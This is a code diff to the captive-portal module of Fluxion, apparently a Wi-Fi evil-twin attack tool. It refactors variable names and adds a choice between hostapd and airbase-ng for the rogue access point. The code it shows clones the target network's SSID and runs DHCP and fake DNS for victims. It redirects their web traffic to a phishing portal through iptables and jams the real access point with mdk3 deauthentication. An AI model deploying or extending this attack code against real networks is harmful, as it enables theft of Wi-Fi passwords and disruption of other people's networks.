@@ -16,8 +16,8 @@ CaptivePortalAuthenticationMethodsInfo=(
 # ============= < Virtual Network Configuration > ============ #
 # To avoid collapsing with an already existing network,
 # we'll use a somewhat uncommon network and server IP.
-CaptivePortalVIGWAddress="192.168.254.1"
-CaptivePortalVIGWNetwork=${CaptivePortalVIGWAddress%.*}
+CaptivePortalGatewayAddress="192.168.254.1"
+CaptivePortalGatewayNetwork=${CaptivePortalGatewayAddress%.*}
 
 
 # ============================================================ #
@@ -103,6 +103,65 @@ captive_portal_set_ap_interface() {
   fi
 }
 
+function captive_portal_unset_ap_service() {
+  if [ ! "$CaptivePortalAPService" ]; then return 1; fi
+
+  CaptivePortalAPService=""
+
+  # Since we're auto-selecting when on auto, trigger undo-chain.
+  if [ "$FLUXIONAuto" ]; then return 2; fi
+
+  if ! interface_is_wireless "$CaptivePortalAPInterface"; then
+    return 3;
+  fi
+}
+
+function captive_portal_set_ap_service() {
+  if [ "$CaptivePortalAPService" ]; then return 0; fi
+  if ! interface_is_wireless "$CaptivePortalAPInterface"; then
+    return 0;
+  fi
+
+  captive_portal_unset_ap_service
+
+  if [ "$FLUXIONAuto" ]; then
+    CaptivePortalAPService="hostapd"
+  else
+    fluxion_header
+
+    echo -e "$FLUXIONVLine $CaptivePortalAPServiceQuery"
+    echo
+
+    fluxion_target_show
+
+    local choices=(
+      "$CaptivePortalAPServiceHostapdOption"
+      "$CaptivePortalAPServiceAirbaseOption"
+      "$FLUXIONGeneralBackOption"
+    )
+    io_query_choice "" choices[@]
+
+    echo
+
+    case "$IOQueryChoice" in
+      "$CaptivePortalAPServiceHostapdOption")
+        CaptivePortalAPService="hostapd" ;;
+      "$CaptivePortalAPServiceAirbaseOption")
+        CaptivePortalAPService="airbase-ng" ;;
+      "$FLUXIONGeneralBackOption")
+        return 1
+        ;;
+    *)
+      fluxion_conditional_bail "Invalid AP service selected!"
+      return 1
+      ;;
+    esac
+  fi
+
+  # AP Service: Load the service's helper routines.
+  source "lib/ap/$CaptivePortalAPService.sh"
+}
+
 captive_portal_unset_authenticator() {
   if [ ! "$CaptivePortalAuthenticatorMode" ]; then return 0; fi
 
@@ -144,8 +203,7 @@ captive_portal_set_authenticator() {
     echo -e "$FLUXIONVLine $CaptivePortalVerificationMethodQuery"
     echo
 
-    fluxion_target_show "$FluxionTargetSSID" "$FluxionTargetEncryption" \
-      "$FluxionTargetChannel" "$FluxionTargetMAC" "$FluxionTargetMaker"
+    fluxion_target_show
 
     local choices=(
       "${CaptivePortalAuthenticationMethods[@]}"
@@ -450,8 +508,8 @@ captive_portal_unset_attack() {
   sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal"
 
   # Only reset the AP if one has been defined.
-  if [ "$APRogueService" -a "$(type -t ap_reset)" ]; then
-    ap_reset
+  if [ "$CaptivePortalAPService" -a "$(type -t ap_service_reset)" ]; then
+    ap_service_reset
   fi
 }
 
@@ -483,26 +541,33 @@ captive_portal_set_attack() {
 
 
   # AP Service: Prepare service for an attack.
-  if [ "$APRogueService" ]; then
-    ap_prep
+  if [ "$CaptivePortalAPService" ]; then
+    ap_service_prep \
+      "$CaptivePortalAPInterface" \
+      "$CaptivePortalGatewayAddress" \
+      "$FluxionTargetSSID" \
+      "$FluxionTargetRogueMAC" \
+      "$FluxionTargetChannel"
+
+    CaptivePortalAccessInterface=$APServiceAccessInterface
   fi
 
 
   # Generate the dhcpd configuration file, which is
-  # used to provide DHCP service to APRogue clients.
+  # used to provide DHCP service to rogue AP clients.
   echo "\
 authoritative;
 
 default-lease-time 600;
 max-lease-time 7200;
 
-subnet $CaptivePortalVIGWNetwork.0 netmask 255.255.255.0 {
-	option broadcast-address $CaptivePortalVIGWNetwork.255;
-	option routers $CaptivePortalVIGWAddress;
+subnet $CaptivePortalGatewayNetwork.0 netmask 255.255.255.0 {
+	option broadcast-address $CaptivePortalGatewayNetwork.255;
+	option routers $CaptivePortalGatewayAddress;
 	option subnet-mask 255.255.255.0;
-	option domain-name-servers $CaptivePortalVIGWAddress;
+	option domain-name-servers $CaptivePortalGatewayAddress;
 
-	range $CaptivePortalVIGWNetwork.100 $CaptivePortalVIGWNetwork.254;
+	range $CaptivePortalGatewayNetwork.100 $CaptivePortalGatewayNetwork.254;
 }\
 " >"$FLUXIONWorkspacePath/dhcpd.conf"
 
@@ -528,7 +593,7 @@ fastcgi.server = (
 	\".php\" => (
 		(
 			\"bin-path\" => \"/usr/bin/php-cgi\",
-			\"socket\" => \"/php.socket\"
+			\"socket\" => \"/tmp/fluxspace/php.socket\"
 		)
 	)
 )
@@ -632,7 +697,7 @@ class DNSQuery:
     return packet
 
 if __name__ == '__main__':
-  ip='$CaptivePortalVIGWAddress'
+  ip='$CaptivePortalGatewayAddress'
   print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip
 
   udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -757,7 +822,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
 
   local -r staticSSID=$(printf "%q" "$FluxionTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
   echo "
-	DHCPClients=($(nmap -PR -sn -n -oG - $CaptivePortalVIGWNetwork.100-110 2>&1 | grep Host))
+	DHCPClients=($(nmap -PR -sn -n -oG - $CaptivePortalGatewayNetwork.100-110 2>&1 | grep Host))
 
 	echo
 	echo -e \"  ACCESS POINT:\"
@@ -981,7 +1046,7 @@ captive_portal_unset_routes() {
     sandbox_remove_workfile "$FLUXIONWorkspacePath/ip_forward"
   fi
 
-  ip addr del $CaptivePortalVIGWAddress/24 dev $VIGW 2>/dev/null
+  ip addr del $CaptivePortalGatewayAddress/24 dev $CaptivePortalAccessInterface 2>/dev/null
 }
 
 # Set up DHCP / WEB server
@@ -989,7 +1054,7 @@ captive_portal_unset_routes() {
 captive_portal_set_routes() {
   # Give an address to the gateway interface in the rogue network.
   # This makes the interface accessible from the rogue network.
-  ip addr add $CaptivePortalVIGWAddress/24 dev $VIGW
+  ip addr add $CaptivePortalGatewayAddress/24 dev $CaptivePortalAccessInterface
 
   # Save the system's routing state to restore later.
   cp "/proc/sys/net/ipv4/ip_forward" "$FLUXIONWorkspacePath/ip_forward"
@@ -1006,9 +1071,9 @@ captive_portal_set_routes() {
   iptables -P FORWARD ACCEPT
 
   iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \
-    --to-destination $CaptivePortalVIGWAddress:80
+    --to-destination $CaptivePortalGatewayAddress:80
   iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT \
-    --to-destination $CaptivePortalVIGWAddress:443
+    --to-destination $CaptivePortalGatewayAddress:443
   iptables -A INPUT -p tcp --sport 443 -j ACCEPT
   iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
   iptables -t nat -A POSTROUTING -j MASQUERADE
@@ -1017,27 +1082,27 @@ captive_portal_set_routes() {
 captive_portal_stop_interface() {
   captive_portal_unset_routes
 
-  if [ "$APRogueService" ]; then
-    ap_stop
+  if [ "$CaptivePortalAPService" ]; then
+    ap_service_stop
   fi
 }
 
 captive_portal_start_interface() {
-  if [ "$APRogueService" ]; then
+  if [ "$CaptivePortalAPService" ]; then
     echo -e "$FLUXIONVLine $CaptivePortalStaringAPServiceNotice"
-    ap_start
+    ap_service_start
   else
     fluxion_header
 
     echo -e "$FLUXIONVLine Configuration for external access point device:"
     echo
 
-    fluxion_target_show "$APRogueSSID" "OPEN" "$FluxionTargetChannel" "$APRogueMAC" "$FluxionTargetMaker"
+    fluxion_target_show
 
-    echo -e "$FLUXIONVLine IPv4 Address: ${CaptivePortalVIGWAddress%.*}.2/24"
+    echo -e "$FLUXIONVLine IPv4 Address: ${CaptivePortalGatewayAddress%.*}.2/24"
     echo -e "$FLUXIONVLine IPv6 Address: Disabled"
-    echo -e "$FLUXIONVLine  DHCP Server: $CaptivePortalVIGWAddress"
-    echo -e "$FLUXIONVLine   DNS Server: $CaptivePortalVIGWAddress"
+    echo -e "$FLUXIONVLine  DHCP Server: $CaptivePortalGatewayAddress"
+    echo -e "$FLUXIONVLine   DNS Server: $CaptivePortalGatewayAddress"
     echo
 
     echo -e "$FLUXIONVLine ${CYel}Assure external AP device is available & configured before continuing!${CClr}"
@@ -1124,6 +1189,7 @@ prep_attack() {
   local sequence=(
     "set_jammer_interface"
     "set_ap_interface"
+    "set_ap_service"
     "set_authenticator"
     "set_certificate"
     "set_connectivity"
@@ -1196,7 +1262,7 @@ start_attack() {
   echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
   xterm $FLUXIONHoldXterm $TOPLEFT -bg black -fg "#CCCC00" \
     -title "FLUXION AP DHCP Service" -e \
-    "dhcpd -d -f -lf \"$FLUXIONWorkspacePath/dhcpd.leases\" -cf \"$FLUXIONWorkspacePath/dhcpd.conf\" $VIGW 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\"" &
+    "dhcpd -d -f -lf \"$FLUXIONWorkspacePath/dhcpd.leases\" -cf \"$FLUXIONWorkspacePath/dhcpd.conf\" $CaptivePortalAccessInterface 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\"" &
   # Save parent's pid, to get to child later.
   CaptivePortalDHCPServiceXtermPID=$!
 
@@ -1221,7 +1287,7 @@ start_attack() {
   echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk3_blacklist.lst"
   xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
     -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-    "mdk3 $WIMonitor d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
+    "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
   # Save parent's pid, to get to child later.
   CaptivePortalJammerServiceXtermPID=$!
 
